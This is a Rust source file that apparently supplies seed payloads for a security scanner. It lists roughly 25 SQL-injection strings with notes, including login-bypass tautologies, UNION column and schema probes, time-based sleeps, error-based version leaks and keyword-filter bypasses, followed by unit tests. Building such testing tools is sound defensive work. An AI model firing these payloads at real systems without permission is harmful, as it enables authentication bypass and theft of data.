//! SQL-injection seed payloads.
//!
//! Curated from `swisskyrepo/PayloadsAllTheThings/SQL Injection`
//! (MIT). Selection prioritizes payloads that produce a deterministic,
//! observable signal — error messages, boolean differentials,
//! time-based deltas — so the primitive verifier can adjudicate
//! cleanly without an LLM in the loop.

use crate::{Payload, PayloadCategory};

const C: PayloadCategory = PayloadCategory::Sqli;

pub static PAYLOADS: &[Payload] = &[
    Payload {
        category: C,
        value: "'",
        notes: "single-quote — minimal probe; surfaces a SQL error if the input is concatenated unsafely",
        tags: &["error", "minimal"],
    },
    Payload {
        category: C,
        value: "\"",
        notes: "double-quote — same as ' for engines that quote with \"",
        tags: &["error", "minimal"],
    },
    Payload {
        category: C,
        value: "')",
        notes: "close-paren-quote — catches when input is inside a function call",
        tags: &["error"],
    },
    Payload {
        category: C,
        value: "' OR '1'='1",
        notes: "classic boolean tautology — login bypass on weak query shapes",
        tags: &["boolean", "auth-bypass"],
    },
    Payload {
        category: C,
        value: "' OR 1=1-- -",
        notes: "boolean tautology with line-comment terminator (MySQL/Postgres)",
        tags: &["boolean", "mysql", "postgres"],
    },
    Payload {
        category: C,
        value: "\" OR \"1\"=\"1\"-- -",
        notes: "double-quoted boolean tautology",
        tags: &["boolean"],
    },
    Payload {
        category: C,
        value: "' UNION SELECT NULL-- -",
        notes: "single-column UNION probe — column-count discovery",
        tags: &["union", "discovery"],
    },
    Payload {
        category: C,
        value: "' UNION SELECT NULL,NULL-- -",
        notes: "two-column UNION probe",
        tags: &["union", "discovery"],
    },
    Payload {
        category: C,
        value: "' UNION SELECT NULL,NULL,NULL-- -",
        notes: "three-column UNION probe",
        tags: &["union", "discovery"],
    },
    Payload {
        category: C,
        value: "' AND SLEEP(5)-- -",
        notes: "MySQL time-based — 5s delay signals injection without needing UNION",
        tags: &["time-based", "mysql"],
    },
    Payload {
        category: C,
        value: "'; SELECT pg_sleep(5)-- -",
        notes: "Postgres time-based — pg_sleep variant",
        tags: &["time-based", "postgres"],
    },
    Payload {
        category: C,
        value: "'; WAITFOR DELAY '0:0:5'-- -",
        notes: "MSSQL time-based — WAITFOR DELAY variant",
        tags: &["time-based", "mssql"],
    },
    Payload {
        category: C,
        value: "' AND extractvalue(1,concat(0x7e,version()))-- -",
        notes: "MySQL error-based — leaks @@version through extractvalue",
        tags: &["error-based", "mysql", "exfil"],
    },
    Payload {
        category: C,
        value: "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -",
        notes: "MySQL time-based with subquery — survives ORDER BY contexts",
        tags: &["time-based", "mysql"],
    },
    Payload {
        category: C,
        value: "1' OR (SELECT 1 FROM (SELECT(SLEEP(5)))b)-- -",
        notes: "numeric-context MySQL time-based",
        tags: &["time-based", "mysql", "numeric"],
    },
    Payload {
        category: C,
        value: "admin'-- -",
        notes: "comment-out password check — login-bypass when user input is the first column",
        tags: &["auth-bypass"],
    },
    Payload {
        category: C,
        value: "admin' OR 1=1#",
        notes: "MySQL `#` comment login-bypass",
        tags: &["auth-bypass", "mysql"],
    },
    Payload {
        category: C,
        value: "' AND 1=CONVERT(int,@@version)-- -",
        notes: "MSSQL error-based — implicit cast leaks @@version",
        tags: &["error-based", "mssql", "exfil"],
    },
    Payload {
        category: C,
        value: "0 UNION SELECT NULL,table_name FROM information_schema.tables-- -",
        notes: "schema discovery via information_schema (MySQL/Postgres/MSSQL)",
        tags: &["union", "schema", "exfil"],
    },
    Payload {
        category: C,
        value: "\\'",
        notes: "escaped quote — surfaces 2nd-order injection through unescape",
        tags: &["second-order"],
    },
    Payload {
        category: C,
        value: "'||(SELECT '')||'",
        notes: "Oracle / DB2 concat — quotes balanced via `||`",
        tags: &["oracle", "concat"],
    },
    Payload {
        category: C,
        value: "' OR ''='",
        notes: "tautology that survives strict equality contexts",
        tags: &["boolean"],
    },
    Payload {
        category: C,
        value: "' AND IF(SUBSTRING(@@version,1,1)='5',SLEEP(5),0)-- -",
        notes: "MySQL boolean-time blind — first byte of version",
        tags: &["blind", "time-based", "mysql"],
    },
    Payload {
        category: C,
        value: "%27%20OR%201%3D1--%20-",
        notes: "URL-encoded boolean tautology — defeats naive char filters",
        tags: &["encoding", "boolean"],
    },
    Payload {
        category: C,
        value: "/*!50000UNION*/ /*!50000SELECT*/ NULL-- -",
        notes: "MySQL versioned-comment UNION bypass for keyword filters",
        tags: &["waf-bypass", "mysql"],
    },
];

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn every_payload_has_non_empty_value() {
        for p in PAYLOADS {
            assert!(!p.value.is_empty());
            assert_eq!(p.category, PayloadCategory::Sqli);
        }
    }

    #[test]
    fn time_based_payloads_mention_sleep_or_waitfor() {
        let tb: Vec<_> = PAYLOADS.iter().filter(|p| p.tags.contains(&"time-based")).collect();
        assert!(!tb.is_empty());
        for p in tb {
            let v = p.value.to_ascii_uppercase();
            assert!(
                v.contains("SLEEP") || v.contains("WAITFOR") || v.contains("PG_SLEEP"),
                "time-based payload missing sleep: {}",
                p.value
            );
        }
    }

    #[test]
    fn auth_bypass_payloads_contain_or_or_comment() {
        for p in PAYLOADS.iter().filter(|p| p.tags.contains(&"auth-bypass")) {
            let v = p.value.to_ascii_uppercase();
            assert!(v.contains("OR") || v.contains("--") || v.contains('#'));
        }
    }
}
